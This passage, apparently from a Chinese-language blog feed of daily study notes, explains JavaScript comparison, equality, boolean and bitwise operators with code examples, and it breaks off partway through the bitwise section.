<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = [<span class="number">2</span>];</span><br><span class="line">x &gt; <span class="string">&#x27;11&#x27;</span> <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 等同于 [2].valueOf().toString() &gt; &#x27;11&#x27;</span></span><br><span class="line"><span class="comment">// 即 &#x27;2&#x27; &gt; &#x27;11&#x27;</span></span><br><span class="line"></span><br><span class="line">x.valueOf = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span> &#125;;</span><br><span class="line">x &gt; <span class="string">&#x27;11&#x27;</span> <span class="comment">// false</span></span><br><span class="line"><span class="comment">// 等同于 [2].valueOf() &gt; &#x27;11&#x27;</span></span><br><span class="line"><span class="comment">// 即 &#x27;1&#x27; &gt; &#x27;11&#x27;</span></span><br></pre></td></tr></table></figure>
<p>两个对象之间的比较也是如此</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">2</span>] &gt; [<span class="number">1</span>] <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 等同于 [2].valueOf().toString() &gt; [1].valueOf().toString()</span></span><br><span class="line"><span class="comment">// 即 &#x27;2&#x27; &gt; &#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">[<span class="number">2</span>] &gt; [<span class="number">11</span>] <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 等同于 [2].valueOf().toString() &gt; [11].valueOf().toString()</span></span><br><span class="line"><span class="comment">// 即 &#x27;2&#x27; &gt; &#x27;11&#x27;</span></span><br><span class="line"></span><br><span class="line">&#123; <span class="attr">x</span>: <span class="number">2</span> &#125; &gt;= &#123; <span class="attr">x</span>: <span class="number">1</span> &#125; <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 等同于 &#123; x: 2 &#125;.valueOf().toString() &gt;= &#123; x: 1 &#125;.valueOf().toString()</span></span><br><span class="line"><span class="comment">// 即 &#x27;[object Object]&#x27; &gt;= &#x27;[object Object]&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="2-4-严格相当运算符"><a href="#2-4-严格相当运算符" class="headerlink" title="2.4 严格相当运算符"></a>2.4 严格相当运算符</h4><p>JavaScript 提供两种相等运算符：<code>==</code>和<code>===</code>。</p>
<p>简单说，它们的区别是相等运算符（<code>==</code>）比较两个值是否相等，严格相等运算符（<code>===</code>）比较它们是否为“同一个值”。如果两个值不是同一类型，严格相等运算符（<code>===</code>）直接返回<code>false</code>，而相等运算符（<code>==</code>）会将它们转换成同一个类型，再用严格相等运算符进行比较</p>
<h5 id="2-4-1-不同类型的值"><a href="#2-4-1-不同类型的值" class="headerlink" title="2.4.1 不同类型的值"></a>2.4.1 不同类型的值</h5><p>如果两个值的类型不同，直接返回<code>false</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> === <span class="string">&quot;1&quot;</span> <span class="comment">// false</span></span><br><span class="line"><span class="literal">true</span> === <span class="string">&quot;true&quot;</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码比较数值的<code>1</code>与字符串的“<code>1</code>”、布尔值的<code>true</code>与字符串”<code>true</code>“，因为类型不同，结果都是<code>false</code></p>
<h5 id="2-4-2-同一类型的原始类型值"><a href="#2-4-2-同一类型的原始类型值" class="headerlink" title="2.4.2 同一类型的原始类型值"></a>2.4.2 同一类型的原始类型值</h5><p>同一类型的原始类型的值（数值、字符串、布尔值）比较时，值相同就返回<code>true</code>，值不同就返回<code>false</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> === <span class="number">0x1</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码比较十进制的<code>1</code>与十六进制的<code>1</code>，因为类型和值都相同，返回<code>true</code>。</p>
<p>需要注意的是，<code>NaN</code>与任何值都不相等（包括自身）。另外，正<code>0</code>等于负<code>0</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="literal">NaN</span> === <span class="literal">NaN</span>  <span class="comment">// false</span></span><br><span class="line">+<span class="number">0</span> === -<span class="number">0</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h5 id="2-4-3-复合类型值"><a href="#2-4-3-复合类型值" class="headerlink" title="2.4.3 复合类型值"></a>2.4.3 复合类型值</h5><p>两个复合类型（对象、数组、函数）的数据比较时，不是比较它们的值是否相等，而是比较它们是否指向同一个地址</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;&#125; === &#123;&#125; <span class="comment">// false</span></span><br><span class="line">[] === [] <span class="comment">// false</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125; === <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码分别比较两个空对象、两个空数组、两个空函数，结果都是不相等。原因是对于复合类型的值，严格相等运算比较的是，它们是否引用同一个内存地址，而运算符两边的空对象、空数组、空函数的值，都存放在不同的内存地址，结果当然是<code>false</code><br>如果两个变量引用同一个对象，则它们相等</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> v1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> v2 = v1;</span><br><span class="line">v1 === v2 <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>注意，对于两个对象的比较，严格相等运算符比较的是地址，而大于或小于运算符比较的是值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> obj2 = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">obj1 &gt; obj2 <span class="comment">// false</span></span><br><span class="line">obj1 &lt; obj2 <span class="comment">// false</span></span><br><span class="line">obj1 === obj2 <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面的三个比较，前两个比较的是值，最后一个比较的是地址，所以都返回<code>false</code></p>
<h5 id="2-4-4-undefined和null"><a href="#2-4-4-undefined和null" class="headerlink" title="2.4.4 undefined和null"></a>2.4.4 undefined和null</h5><p><code>undefined</code>和<code>null</code>与自身严格相等</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="literal">undefined</span> === <span class="literal">undefined</span> <span class="comment">// true</span></span><br><span class="line"><span class="literal">null</span> === <span class="literal">null</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>由于变量声明后默认值是<code>undefined</code>，因此两个只声明未赋值的变量是相等的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> v1;</span><br><span class="line"><span class="keyword">var</span> v2;</span><br><span class="line">v1 === v2 <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h4 id="2-5-严格不相等运算符"><a href="#2-5-严格不相等运算符" class="headerlink" title="2.5 严格不相等运算符"></a>2.5 严格不相等运算符</h4><p>严格相等运算符有一个对应的“严格不相等运算符”（<code>!==</code>），它的算法就是先求严格相等运算符的结果，然后返回相反值…</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> !== <span class="string">&#x27;1&#x27;</span> <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">!(<span class="number">1</span> === <span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="2-6-相等运算符"><a href="#2-6-相等运算符" class="headerlink" title="2.6 相等运算符"></a>2.6 相等运算符</h4><p>相等运算符用来比较相同类型的数据时，与严格相等运算符完全一样</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> == <span class="number">1.0</span></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="number">1</span> === <span class="number">1.0</span></span><br></pre></td></tr></table></figure>
<p>比较不同类型的数据时，相等运算符会先将数据进行类型转换，然后再用严格相等运算符比较。下面分成几种情况，讨论不同类型的值互相比较的规则</p>
<h5 id="2-6-1-原始类型值"><a href="#2-6-1-原始类型值" class="headerlink" title="2.6.1 原始类型值"></a>2.6.1 原始类型值</h5><p>原始类型的值会转换成数值再进行比较</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> == <span class="literal">true</span> <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 等同于 1 === Number(true)</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span> == <span class="literal">false</span> <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 等同于 0 === Number(false)</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span> == <span class="literal">true</span> <span class="comment">// false</span></span><br><span class="line"><span class="comment">// 等同于 2 === Number(true)</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span> == <span class="literal">false</span> <span class="comment">// false</span></span><br><span class="line"><span class="comment">// 等同于 2 === Number(false)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;true&#x27;</span> == <span class="literal">true</span> <span class="comment">// false</span></span><br><span class="line"><span class="comment">// 等同于 Number(&#x27;true&#x27;) === Number(true)</span></span><br><span class="line"><span class="comment">// 等同于 NaN === 1</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span> == <span class="number">0</span> <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 等同于 Number(&#x27;&#x27;) === 0</span></span><br><span class="line"><span class="comment">// 等同于 0 === 0</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span> == <span class="literal">false</span>  <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 等同于 Number(&#x27;&#x27;) === Number(false)</span></span><br><span class="line"><span class="comment">// 等同于 0 === 0</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;1&#x27;</span> == <span class="literal">true</span>  <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 等同于 Number(&#x27;1&#x27;) === Number(true)</span></span><br><span class="line"><span class="comment">// 等同于 1 === 1</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;\n  123  \t&#x27;</span> == <span class="number">123</span> <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 因为字符串转为数字时，省略前置和后置的空格</span></span><br></pre></td></tr></table></figure>
<h5 id="2-6-2-对象与原始类型值比较"><a href="#2-6-2-对象与原始类型值比较" class="headerlink" title="2.6.2 对象与原始类型值比较"></a>2.6.2 对象与原始类型值比较</h5><p>对象（这里指广义的对象，包括数组和函数）与原始类型的值比较时，对象转换成原始类型的值，再进行比较<br>具体来说，先调用对象的<code>valueOf()</code>方法，如果得到原始类型的值，就按照上一小节的规则，互相比较；如果得到的还是对象，则再调用<code>toString()</code>方法，得到字符串形式，再进行比较</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数组与数值的比较</span></span><br><span class="line">[<span class="number">1</span>] == <span class="number">1</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组与字符串的比较</span></span><br><span class="line">[<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span> <span class="comment">// true</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>] == <span class="string">&#x27;1,2&#x27;</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象与布尔值的比较</span></span><br><span class="line">[<span class="number">1</span>] == <span class="literal">true</span> <span class="comment">// true</span></span><br><span class="line">[<span class="number">2</span>] == <span class="literal">true</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面例子中，JavaScript 引擎会先对数组<code>[1]</code>调用数组的<code>valueOf()</code>方法，由于返回的还是一个数组，所以会接着调用数组的<code>toString()</code>方法，得到字符串形式，再按照上一小节的规则进行比较<br>下面是一个更直接的例子</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  valueOf: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;执行 valueOf()&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">  &#125;,</span><br><span class="line">  toString: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;执行 toString()&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;foo&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj == <span class="string">&#x27;foo&#x27;</span></span><br><span class="line"><span class="comment">// 执行 valueOf()</span></span><br><span class="line"><span class="comment">// 执行 toString()</span></span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面例子中，<code>obj</code>是一个自定义了<code>valueOf()</code>和<code>toString()</code>方法的对象。这个对象与字符串<code>&#39;foo&#39;</code>进行比较时，会依次调用<code>valueOf()</code>和<code>toString()</code>方法，最后返回<code>&#39;foo&#39;</code>，所以比较结果是<code>true</code></p>
<h5 id="2-6-3-undefined和null"><a href="#2-6-3-undefined和null" class="headerlink" title="2.6.3 undefined和null"></a>2.6.3 undefined和null</h5><p><code>undefined</code>和<code>null</code>只有与自身比较，或者互相比较时，才会返回<code>true</code>；与其他类型的值比较时，结果都为<code>false</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="literal">undefined</span> == <span class="literal">undefined</span> <span class="comment">// true</span></span><br><span class="line"><span class="literal">null</span> == <span class="literal">null</span> <span class="comment">// true</span></span><br><span class="line"><span class="literal">undefined</span> == <span class="literal">null</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="literal">false</span> == <span class="literal">null</span> <span class="comment">// false</span></span><br><span class="line"><span class="literal">false</span> == <span class="literal">undefined</span> <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span> == <span class="literal">null</span> <span class="comment">// false</span></span><br><span class="line"><span class="number">0</span> == <span class="literal">undefined</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h5 id="2-6-4-相等运算符的缺点"><a href="#2-6-4-相等运算符的缺点" class="headerlink" title="2.6.4 相等运算符的缺点"></a>2.6.4 相等运算符的缺点</h5><p>相等运算符隐藏的类型转换，会带来一些违反直觉的结果</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> == <span class="string">&#x27;&#x27;</span>             <span class="comment">// true</span></span><br><span class="line"><span class="number">0</span> == <span class="string">&#x27;0&#x27;</span>            <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span> == <span class="literal">true</span>           <span class="comment">// false</span></span><br><span class="line"><span class="number">2</span> == <span class="literal">false</span>          <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="literal">false</span> == <span class="string">&#x27;false&#x27;</span>    <span class="comment">// false</span></span><br><span class="line"><span class="literal">false</span> == <span class="string">&#x27;0&#x27;</span>        <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="literal">false</span> == <span class="literal">undefined</span>  <span class="comment">// false</span></span><br><span class="line"><span class="literal">false</span> == <span class="literal">null</span>       <span class="comment">// false</span></span><br><span class="line"><span class="literal">null</span> == <span class="literal">undefined</span>   <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; \t\r\n &#x27;</span> == <span class="number">0</span>     <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面这些表达式都不同于直觉，很容易出错。因此建议不要使用相等运算符（<code>==</code>），最好只使用严格相等运算符（<code>===</code>）</p>
<h4 id="2-7-不相等运算符"><a href="#2-7-不相等运算符" class="headerlink" title="2.7 不相等运算符"></a>2.7 不相等运算符</h4><p>相等运算符有一个对应的“不相等运算符”（<code>!=</code>），它的算法就是先求相等运算符的结果，然后返回相反值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> != <span class="string">&#x27;1&#x27;</span> <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">!(<span class="number">1</span> == <span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><code>well,that&#39;s all for today.</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS运算符-比较运算符</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0008</title>
    <url>/2021/05/09/%E6%89%93%E5%8D%A10008/</url>
    <content><![CDATA[<p><font color=red>宇宙洪荒，生命浩瀚，但是只有你和我，真正分享过心跳，时光流转，爱你不变。</font></p>
<h2 id="JS运算符"><a href="#JS运算符" class="headerlink" title="JS运算符"></a>JS运算符</h2><h3 id="3-布尔运算符"><a href="#3-布尔运算符" class="headerlink" title="3. 布尔运算符"></a>3. 布尔运算符</h3><h4 id="3-1-概述"><a href="#3-1-概述" class="headerlink" title="3.1 概述"></a>3.1 概述</h4><p>布尔运算符用于将表达式转为布尔值，一共包含四个运算符</p>
<ul>
<li>取反运算符：<code>!</code></li>
<li>且运算符：<code>&amp;&amp;</code></li>
<li>或运算符：<code>||</code></li>
<li>三元运算符：<code>?:</code><span id="more"></span>
<h4 id="3-2-取反运算符"><a href="#3-2-取反运算符" class="headerlink" title="3.2 取反运算符"></a>3.2 取反运算符</h4>取反运算符是一个感叹号，用于将布尔值变为相反值，即<code>true</code>变成<code>false</code>，<code>false</code>变成<code>true</code><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">!<span class="literal">true</span> <span class="comment">// false</span></span><br><span class="line">!<span class="literal">false</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
对于非布尔值，取反运算符会将其转为布尔值。可以这样记忆，以下六个值取反后为<code>true</code>，其他值都为<code>false</code><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">!<span class="literal">undefined</span> <span class="comment">// true</span></span><br><span class="line">!<span class="literal">null</span> <span class="comment">// true</span></span><br><span class="line">!<span class="literal">false</span> <span class="comment">// true</span></span><br><span class="line">!<span class="number">0</span> <span class="comment">// true</span></span><br><span class="line">!<span class="literal">NaN</span> <span class="comment">// true</span></span><br><span class="line">!<span class="string">&quot;&quot;</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">!<span class="number">54</span> <span class="comment">// false</span></span><br><span class="line">!<span class="string">&#x27;hello&#x27;</span> <span class="comment">// false</span></span><br><span class="line">![] <span class="comment">// false</span></span><br><span class="line">!&#123;&#125; <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
上面代码中，不管什么类型的值，经过取反运算后，都变成了布尔值</li>
</ul>
<p>如果对一个值连续做两次取反运算，等于将其转为对应的布尔值，与<code>Boolean</code>函数的作用相同。这是一种常用的类型转换的写法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">!!x</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="built_in">Boolean</span>(x)</span><br></pre></td></tr></table></figure>
<p>上面代码中，不管<code>x</code>是什么类型的值，经过两次取反运算后，变成了与<code>Boolean</code>函数结果相同的布尔值。所以，两次取反就是将一个值转为布尔值的简便写法</p>
<h4 id="3-3-且运算符"><a href="#3-3-且运算符" class="headerlink" title="3.3 且运算符"></a>3.3 且运算符</h4><p>且运算符（<code>&amp;&amp;</code>）往往用于多个表达式的求值<br>它的运算规则是：如果第一个运算子的布尔值为<code>true</code>，则返回第二个运算子的值（注意是值，不是布尔值）；如果第一个运算子的布尔值为<code>false</code>，则直接返回第一个运算子的值，且不再对第二个运算子求值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;t&#x27;</span> &amp;&amp; <span class="string">&#x27;&#x27;</span> <span class="comment">// &quot;&quot;</span></span><br><span class="line"><span class="string">&#x27;t&#x27;</span> &amp;&amp; <span class="string">&#x27;f&#x27;</span> <span class="comment">// &quot;f&quot;</span></span><br><span class="line"><span class="string">&#x27;t&#x27;</span> &amp;&amp; (<span class="number">1</span> + <span class="number">2</span>) <span class="comment">// 3</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="string">&#x27;f&#x27;</span> <span class="comment">// &quot;&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="string">&#x27;&#x27;</span> <span class="comment">// &quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line">(<span class="number">1</span> - <span class="number">1</span>) &amp;&amp; ( x += <span class="number">1</span>) <span class="comment">// 0</span></span><br><span class="line">x <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码的最后一个例子，由于且运算符的第一个运算子的布尔值为<code>false</code>，则直接返回它的值<code>0</code>，而不再对第二个运算子求值，所以变量x的值没变</p>
<p>这种跳过第二个运算子的机制，被称为“短路”。有些程序员喜欢用它取代if结构，比如下面是一段<code>if</code>结构的代码，就可以用且运算符改写</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (i) &#123;</span><br><span class="line">  doSomething();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"></span><br><span class="line">i &amp;&amp; doSomething();</span><br></pre></td></tr></table></figure>
<p>上面代码的两种写法是等价的，但是后一种不容易看出目的，也不容易除错，建议谨慎使用</p>
<p>且运算符可以多个连用，这时返回第一个布尔值为<code>false</code>的表达式的值。如果所有表达式的布尔值都为<code>true</code>，则返回最后一个表达式的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="literal">true</span> &amp;&amp; <span class="string">&#x27;foo&#x27;</span> &amp;&amp; <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="number">4</span> &amp;&amp; <span class="string">&#x27;foo&#x27;</span> &amp;&amp; <span class="literal">true</span></span><br><span class="line"><span class="comment">// &#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> &amp;&amp; <span class="number">2</span> &amp;&amp; <span class="number">3</span></span><br><span class="line"><span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，例一里面，第一个布尔值为<code>false</code>的表达式为第三个表达式，所以得到一个空字符串。例二里面，所有表达式的布尔值都是<code>true</code>，所以返回最后一个表达式的值<code>3</code></p>
<h4 id="3-4-或运算符"><a href="#3-4-或运算符" class="headerlink" title="3.4 或运算符"></a>3.4 或运算符</h4><p>或运算符（<code>||</code>）也用于多个表达式的求值。它的运算规则是：如果第一个运算子的布尔值为<code>true</code>，则返回第一个运算子的值，且不再对第二个运算子求值；如果第一个运算子的布尔值为<code>false</code>，则返回第二个运算子的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;t&#x27;</span> || <span class="string">&#x27;&#x27;</span> <span class="comment">// &quot;t&quot;</span></span><br><span class="line"><span class="string">&#x27;t&#x27;</span> || <span class="string">&#x27;f&#x27;</span> <span class="comment">// &quot;t&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span> || <span class="string">&#x27;f&#x27;</span> <span class="comment">// &quot;f&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span> || <span class="string">&#x27;&#x27;</span> <span class="comment">// &quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>短路规则对这个运算符也适用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="literal">true</span> || (x = <span class="number">2</span>) <span class="comment">// true</span></span><br><span class="line">x <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，或运算符的第一个运算子为<code>true</code>，所以直接返回<code>true</code>，不再运行第二个运算子。所以，<code>x</code>的值没有改变。这种只通过第一个表达式的值，控制是否运行第二个表达式的机制，就称为“短路”（short-cut）</p>
<p>或运算符可以多个连用，这时返回第一个布尔值为<code>true</code>的表达式的值。如果所有表达式都为<code>false</code>，则返回最后一个表达式的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="literal">false</span> || <span class="number">0</span> || <span class="string">&#x27;&#x27;</span> || <span class="number">4</span> || <span class="string">&#x27;foo&#x27;</span> || <span class="literal">true</span></span><br><span class="line"><span class="comment">// 4</span></span><br><span class="line"></span><br><span class="line"><span class="literal">false</span> || <span class="number">0</span> || <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">// &#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>或运算符常用于为一个变量设置默认值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saveText</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">  text = text || <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者写成</span></span><br><span class="line">saveText(<span class="built_in">this</span>.text || <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>上面代码表示，如果函数调用时，没有提供参数，则该参数默认设置为空字符串</p>
<h4 id="3-5-三元条件运算符"><a href="#3-5-三元条件运算符" class="headerlink" title="3.5 三元条件运算符"></a>3.5 三元条件运算符</h4><p>三元条件运算符由问号（<code>?</code>）和冒号（<code>:</code>）组成，分隔三个表达式。它是 JavaScript 语言唯一一个需要三个运算子的运算符。如果第一个表达式的布尔值为<code>true</code>，则返回第二个表达式的值，否则返回第三个表达式的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;t&#x27;</span> ? <span class="string">&#x27;hello&#x27;</span> : <span class="string">&#x27;world&#x27;</span> <span class="comment">// &quot;hello&quot;</span></span><br><span class="line"><span class="number">0</span> ? <span class="string">&#x27;hello&#x27;</span> : <span class="string">&#x27;world&#x27;</span> <span class="comment">// &quot;world&quot;</span></span><br></pre></td></tr></table></figure>
<p>通常来说，三元条件表达式与<code>if...else</code>语句具有同样表达效果，前者可以表达的，后者也能表达。但是两者具有一个重大差别，<code>if...else</code>是语句，没有返回值；三元条件表达式是表达式，具有返回值。所以，在需要返回值的场合，只能使用三元条件表达式，而不能使用<code>if..else</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="literal">true</span> ? <span class="string">&#x27;T&#x27;</span> : <span class="string">&#x27;F&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>console.log</code>方法的参数必须是一个表达式，这时就只能使用三元条件表达式。如果要用<code>if...else</code>语句，就必须改变整个代码写法了</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS运算符-布尔运算符</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0009</title>
    <url>/2021/05/09/%E6%89%93%E5%8D%A10009/</url>
    <content><![CDATA[<p><font color=#b2d235>人生越是艰难处，越要往前多走几步</font></p>
<h2 id="JS运算符"><a href="#JS运算符" class="headerlink" title="JS运算符"></a>JS运算符</h2><h3 id="4-二进制位运算符"><a href="#4-二进制位运算符" class="headerlink" title="4. 二进制位运算符"></a>4. 二进制位运算符</h3><h4 id="4-1-概述"><a href="#4-1-概述" class="headerlink" title="4.1 概述"></a>4.1 概述</h4><p>二进制位运算符用于直接对二进制位进行计算，一共有7个</p>
<ul>
<li>二进制或运算符（or）：符号为<code>|</code>，表示若两个二进制位都为<code>0</code>，则结果为<code>0</code>，否则为<code>1</code>。</li>
<li>二进制与运算符（and）：符号为<code>&amp;</code>，表示若两个二进制位都为<code>1</code>，则结果为<code>1</code>，否则为<code>0</code>。</li>
<li>二进制否运算符（not）：符号为<code>~</code>，表示对一个二进制位取反。</li>
<li>异或运算符（xor）：符号为<code>^</code>，表示若两个二进制位不相同，则结果为<code>1</code>，否则为<code>0</code>。</li>
<li>左移运算符（left shift）：符号为<code>&lt;&lt;</code>，详见下文解释。</li>
<li>右移运算符（right shift）：符号为<code>&gt;&gt;</code>，详见下文解释。</li>
<li>头部补零的右移运算符（zero filled right shift）：符号为<code>&gt;&gt;&gt;</code>，详见下文解释。<span id="more"></span></li>
</ul>
<p>这些位运算符直接处理每一个比特位（bit），所以是非常底层的运算，好处是速度极快，缺点是很不直观，许多场合不能使用它们，否则会使代码难以理解和查错</p>
<p>有一点需要特别注意，位运算符只对整数起作用，如果一个运算子不是整数，会自动转为整数后再执行。另外，虽然在 JavaScript 内部，数值都是以64位浮点数的形式储存，但是做位运算的时候，是以32位带符号的整数进行运算的，并且返回值也是一个32位带符号的整数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">i = i | <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>上面这行代码的意思，就是将<code>i</code>（不管是整数或小数）转为32位整数<br>利用这个特性，可以写出一个函数，将任意数值转为32位整数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toInt32</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x | <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面这个函数将任意值与0进行一次或运算，这个位运算会自动将一个值转为32位整数。下面是这个函数的用法</p>
